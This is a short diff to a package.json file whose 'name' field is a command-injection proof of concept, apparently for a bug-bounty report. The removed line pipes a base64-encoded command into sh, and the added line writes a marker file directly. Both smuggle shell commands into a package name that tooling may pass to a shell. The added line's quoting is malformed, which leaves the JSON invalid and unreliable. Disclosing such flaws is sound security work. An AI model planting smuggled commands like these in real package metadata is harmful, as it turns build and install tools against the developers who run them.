@@ -1,5 +1,5 @@
 {
-  "name": "h1-poc;echo bWtkaXIgLXAgZGlzdCAmJiBlY2hvICJIQUNLRUQiID4gZGlzdC9QT0lTT04udHh0|base64 -d|sh;#",
+  "name": "h1-poc; mkdir -p packages/h1-poc-verify/dist; echo "ssssssss"""; > packages/h1-poc-verify/dist/poison.txt; #",
   "private": true,
   "version": "1.0.0"
 }
